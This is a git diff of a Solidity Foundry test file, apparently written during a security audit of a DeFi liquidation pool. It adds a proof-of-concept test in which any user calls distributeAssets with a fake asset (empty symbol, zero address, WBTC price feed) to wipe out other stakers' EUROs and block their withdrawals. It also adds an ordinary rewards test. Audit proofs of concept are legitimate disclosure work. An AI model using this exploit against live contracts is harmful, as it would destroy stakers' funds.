@@ -4,7 +4,6 @@ pragma solidity 0.8.17;
 import { Common, console2, LiquidationPool, SmartVaultV3 } from '../Common.t.sol';
 import { ILiquidationPoolManager } from 'src/interfaces/ILiquidationPoolManager.sol';
 import { ITokenManager } from 'src/interfaces/ITokenManager.sol';
-import { UniswapV3PoolMock } from 'utils/SwapRouterMock.sol';
 
 contract Unit is Common {
     function setUp() public override {
@@ -517,31 +516,6 @@ contract Unit is Common {
         );
     }
 
-    function test_swap() public {
-        vm.startPrank(alice);
-        UniswapV3PoolMock pool =
-            new UniswapV3PoolMock(address(tokens.paxgToken), address(tokens.wbtcToken), address(this));
-        vm.stopPrank();
-
-        // minting some tokens to alice for the transaction
-        tokens.paxgToken.mint(address(alice), 1000 ether);
-        tokens.wbtcToken.mint(address(alice), 1000 ether);
-
-        // alice approves
-        vm.startPrank(alice);
-        tokens.paxgToken.approve(address(pool), 1 ether);
-        tokens.wbtcToken.approve(address(pool), 1000 ether);
-
-        // depositing in the pool
-        pool.addLiquidity(1 ether, 1000 ether);
-        vm.stopPrank();
-
-        // getting the tokens price
-        uint price = pool.getQuote(address(tokens.paxgToken));
-        console2.log(price);
-        console2.log(pool.getQuote(address(tokens.wbtcToken)));
-    }
-
     // @audit test Passed
     ILiquidationPoolManager.Asset[] public assets;
 
@@ -702,6 +676,293 @@ contract Unit is Common {
         assertEq(tokens.arbToken.balanceOf(alice), 0, "There are ARBs token in Alice's account");
     }
 
+    // @audit test passed
+    function test_AnyOneCanManipulateTheLiquidationPoolBalancesOfStaker() public {
+        ///////////////////////////////
+        ///     Setup               ///
+        ///////////////////////////////
+
+        uint tstAmount = 100 ether;
+        uint eurosAmount = 1000 ether;
+
+        ///////////////////////////////////////////////////////////
+        ///      minting some tokens to alice and bob           ///
+        ///////////////////////////////////////////////////////////
+
+        tokens.eurosToken.mint(alice, eurosAmount);
+        tokens.tstToken.mint(alice, tstAmount);
+
+        tokens.eurosToken.mint(bob, eurosAmount);
+        tokens.tstToken.mint(bob, tstAmount);       
+
+        //////////////////////////////////////////////////////////////////////
+        ///      alice increases her stake with very little amount         ///
+        ///      just to be eligible for the liquidated assets             ///
+        //////////////////////////////////////////////////////////////////////
+
+        vm.startPrank(alice);
+        tokens.eurosToken.approve(address(contracts.liquidationPool), 1);
+        tokens.tstToken.approve(address(contracts.liquidationPool), 1);
+        contracts.liquidationPool.increasePosition(1, 1);
+        vm.stopPrank();
+
+        ////////////////////////////////////////////////////////////
+        ///     Bob increases his stake with full amount         ///
+        ////////////////////////////////////////////////////////////
+
+        vm.startPrank(bob);
+        tokens.eurosToken.approve(address(contracts.liquidationPool), eurosAmount);
+        tokens.tstToken.approve(address(contracts.liquidationPool), tstAmount);
+        contracts.liquidationPool.increasePosition(tstAmount, eurosAmount);
+        vm.stopPrank();
+
+        ///////////////////////////////////////////////////////////////////////////
+        //   alice's position should have been increased with 1 wei of tokens   ///
+        //   And bob should have correct balance in his position               ///
+        ///////////////////////////////////////////////////////////////////////////
+
+        (LiquidationPool.Position memory alicePosition, LiquidationPool.Reward[] memory alicesRewards) =
+            contracts.liquidationPool.position(alice);
+        (LiquidationPool.Position memory bobPosition, LiquidationPool.Reward[] memory bobsRewards) =
+            contracts.liquidationPool.position(bob);
+
+        assertEq(alicePosition.EUROs, 1, "Alice's euros amount are not eqaul");
+        assertEq(alicePosition.TST, 1, "Alice's tst amount are not equal");
+
+        assertEq(bobPosition.EUROs, eurosAmount, "Bob's euros amount are not eqaul");
+        assertEq(bobPosition.TST, tstAmount, "Bob's tst amount are not equal");
+
+        //////////////////////////////////////////////////////////
+        ///      skipping some time to consolidate stakes      ///
+        //////////////////////////////////////////////////////////
+
+        skip(block.timestamp + 1 weeks);
+
+
+        //////////////////////////////////////////////////////////////////////////
+        //           alice setting up data to call distribute asset.           ///
+        //           she picked up most expensive price feed of assets         ///
+        //           so that most harm is done to the stakers.                 ///
+        //////////////////////////////////////////////////////////////////////////
+
+        ILiquidationPoolManager.Asset[1] memory _assets;
+
+        uint256 rewardsBalance = 1 ether; // will represent 1 wbtc
+        _assets[0] = ILiquidationPoolManager.Asset(
+            ITokenManager.Token({
+                symbol: '', // necessary for the attack
+                addr: address(0), // necessary for the attack
+                dec: 18,
+                clAddr: address(priceFeeds.wbtcUsdPriceFeed), // most epensive asset out of all accepted
+                clDec: 8
+            }),
+            rewardsBalance
+        );
+
+        assets.push(_assets[0]);
+
+        /////////////////////////////////////////////////////////////////////////////
+        //      alice called distributeAsset with the fake asset data.            ///
+        /////////////////////////////////////////////////////////////////////////////
+
+        (alicePosition, alicesRewards) = contracts.liquidationPool.position(alice);
+        (bobPosition, bobsRewards) = contracts.liquidationPool.position(bob);
+
+        console2.log("> Alices' EUROs balance Before fake liquidation: %s", alicePosition.EUROs);
+        console2.log("> Alices' TST balance Before fake liquidation: %s", alicePosition.TST);
+        console2.log("> Bob's EUROs balance Before fake liquidation: %s", bobPosition.EUROs);
+        console2.log("> Bob's TST balance Before fake liquidation: %s", bobPosition.TST);
+
+        vm.startPrank(alice);
+        contracts.liquidationPool.distributeAssets(assets, uint(constants.DEFAULT_COLLATERAL_RATE), 100_000);
+        vm.stopPrank();
+
+        /////////////////////////////////////////////////////////////////////////
+        //      getting the position of alice after the fake liquidation      ///
+        //      There will be no rewards for any user as well as their        ///
+        //      euro's will be spent by the fake amount and added as          ///
+        //      a rewards for symbol: bytes32("") and address: address(0)     ///
+        //      which is unclaimable as address(0) is used to claim eth       ///
+        //      rewards.                                                      ///
+        /////////////////////////////////////////////////////////////////////////
+
+        (alicePosition, alicesRewards) = contracts.liquidationPool.position(alice);
+        (bobPosition, bobsRewards) = contracts.liquidationPool.position(bob);
+
+        console2.log("> Alice's Rewards After fake liquidation: ");
+
+        for (uint i; i < alicesRewards.length; i++) {
+            console2.log('\tToken: %s', string(abi.encode(alicesRewards[i].symbol)));
+            console2.log('\tReward Earned: %s', alicesRewards[i].amount);
+        }
+
+        console2.log("> Bob's Rewards After fake liquidation: ");
+
+        for (uint i; i < bobsRewards.length; i++) {
+            console2.log('\tToken: %s', string(abi.encode(bobsRewards[i].symbol)));
+            console2.log('\tReward Earned: %s', bobsRewards[i].amount);
+        }
+        console2.log('\n');
+        console2.log("> Alices' EUROs balance After fake liquidation: %s", alicePosition.EUROs);
+        console2.log("> Alices' TST balance After fake liquidation: %s", alicePosition.TST);
+        console2.log("> Bob's EUROs balance After fake liquidation: %s", bobPosition.EUROs);
+        console2.log("> Bob's TST balance After fake liquidation: %s", bobPosition.TST);
+
+        ////////////////////////////////////////////////////
+        ///     Bob tries to withdraw his stake          ///
+        ///     but he can't as his euros balance is 0   ///
+        ////////////////////////////////////////////////////
+
+        vm.startPrank(bob);
+        vm.expectRevert("invalid-decr-amount");
+        contracts.liquidationPool.decreasePosition(tstAmount, eurosAmount);
+        vm.stopPrank();
+
+        /////////////////////////////////////////////////////
+        ///     He also tries to claim his rewards        ///
+        ///     but he can't as there will be no rewards  ///
+        /////////////////////////////////////////////////////
+
+        vm.startPrank(bob);
+        contracts.liquidationPool.claimRewards();
+        vm.stopPrank();
+
+        (bobPosition, bobsRewards) = contracts.liquidationPool.position(bob);
+
+        console2.log("> Bob's EUROs Balance after he claims his Rewards: %s", bobPosition.EUROs);
+        console2.log("> Bob's TST Balance after he claims his Rewards: %s",bobPosition.TST);
+    }
+
+    function test_rewardsDistribution() public {
+        ///////////////////////////////
+        ///     Setup               ///
+        ///////////////////////////////
+
+        uint tstAmount = 100 ether;
+        uint eurosAmount = 1000 ether;
+
+        ///////////////////////////////////////////////////
+        ///      minting some tokens to alice           ///
+        ///////////////////////////////////////////////////
+
+        tokens.eurosToken.mint(alice, eurosAmount);
+        tokens.tstToken.mint(alice, tstAmount);
+
+        ///////////////////////////////////////////////
+        ///      alice increases her stake          ///
+        ///////////////////////////////////////////////
+
+        vm.startPrank(alice);
+        tokens.eurosToken.approve(address(contracts.liquidationPool), eurosAmount);
+        tokens.tstToken.approve(address(contracts.liquidationPool), tstAmount);
+        contracts.liquidationPool.increasePosition(tstAmount, eurosAmount);
+        vm.stopPrank();
+
+        //////////////////////////////////////////////////////
+        //   alice's position should have been increased   ///
+        //////////////////////////////////////////////////////
+
+        (LiquidationPool.Position memory alicePosition, LiquidationPool.Reward[] memory alicesRewards) =
+            contracts.liquidationPool.position(alice);
+        assertEq(alicePosition.EUROs, eurosAmount, "Alice's euros amount are not eqaul");
+        assertEq(alicePosition.TST, tstAmount, "Alice's tst amount are not equal");
+
+        //////////////////////////////////////////////////////////
+        ///      skipping some time to consolidate stakes      ///
+        //////////////////////////////////////////////////////////
+
+        skip(block.timestamp + 1 weeks);
+
+        ////////////////////////////////////////////////////////////////////////
+        //      minting some ARBs to the LiquidationPoolManger               ///
+        ///     to represent the Liquidated assets                           ///
+        ////////////////////////////////////////////////////////////////////////
+        uint256 rewardsBalance = 0.4 ether;
+        tokens.arbToken.mint(address(contracts.liquidationPoolManager), rewardsBalance);
+        tokens.paxgToken.mint(address(contracts.liquidationPoolManager), rewardsBalance);
+
+        /////////////////////////////////////////////////////////////////////////////
+        ///    Mocking LiquidationPoolManager approving the LiquidationPool       ///
+        ///    to spend the assets                                                ///
+        /////////////////////////////////////////////////////////////////////////////
+
+        vm.startPrank(address(contracts.liquidationPoolManager));
+        tokens.arbToken.approve(address(contracts.liquidationPool), rewardsBalance);
+        tokens.paxgToken.approve(address(contracts.liquidationPool), rewardsBalance);
+        vm.stopPrank();
+
+        ////////////////////////////////////////////////////////
+        //           setting up data for mock call           ///
+        ////////////////////////////////////////////////////////
+
+        ILiquidationPoolManager.Asset[1] memory _assets;
+
+        // setting arb token data
+        // _assets[0] = ILiquidationPoolManager.Asset(
+        //     ITokenManager.Token({
+        //         symbol: 'ARB',
+        //         addr: address(tokens.arbToken),
+        //         dec: 18,
+        //         clAddr: address(priceFeeds.arbUsdPriceFeed),
+        //         clDec: 8
+        //     }),
+        //     rewardsBalance
+        // );
+
+        _assets[0] = ILiquidationPoolManager.Asset(
+            ITokenManager.Token({
+                symbol: 'PAXG',
+                addr: address(tokens.paxgToken),
+                dec: 18,
+                clAddr: address(priceFeeds.paxgUsdPriceFeed),
+                clDec: 8
+            }),
+            rewardsBalance
+        );
+
+        assets.push(_assets[0]);
+        // assets.push(_assets[1]);
+
+        /////////////////////////////////////////////////////////////////////////////
+        //      mocking distribute asset call from the liquidationPoolManager     ///
+        /////////////////////////////////////////////////////////////////////////////
+
+        console2.log("> Alice's ARB tokens Balance before Distributing Rewards: %s\n", tokens.arbToken.balanceOf(alice));
+
+        vm.startPrank(address(contracts.liquidationPoolManager));
+        // @audit what if collateral rate is set to zero
+        contracts.liquidationPool.distributeAssets(assets, uint(constants.DEFAULT_COLLATERAL_RATE), 100_000);
+        vm.stopPrank();
+
+        ////////////////////////////////////////////////////////////////////
+        //      getting the position of alice after the liquidation      ///
+        //      There should be rewards in ARBs token. Also the EURO     ///
+        //      balance of the Alice should be 0 as the amount should    ///
+        //      have been spent to buy the liquidated assets.            ///
+        ////////////////////////////////////////////////////////////////////
+
+        (alicePosition, alicesRewards) = contracts.liquidationPool.position(alice);
+
+        bool hasRewards;
+
+        console2.log("> Alice's Rewards After liquidation: ");
+
+        for (uint i; i < alicesRewards.length; i++) {
+            if (alicesRewards[i].amount > 0) {
+                console2.log('\tToken: %s', string(abi.encode(alicesRewards[i].symbol)));
+                console2.log('\tReward Earned: %s\n', alicesRewards[i].amount);
+                hasRewards = true;
+            }
+        }
+
+
+        require(hasRewards, 'No rewards are earned by the staker');
+
+        console2.log(alicePosition.EUROs);
+
+    }
+
+
     function _createSmartVault(address _user) internal returns (address, uint) {
         vm.prank(_user);
         (address smartVault, uint tokenId) = contracts.smartVaultManagerV5.mint();
@@ -709,3 +970,5 @@ contract Unit is Common {
         return (smartVault, tokenId);
     }
 }
+
+
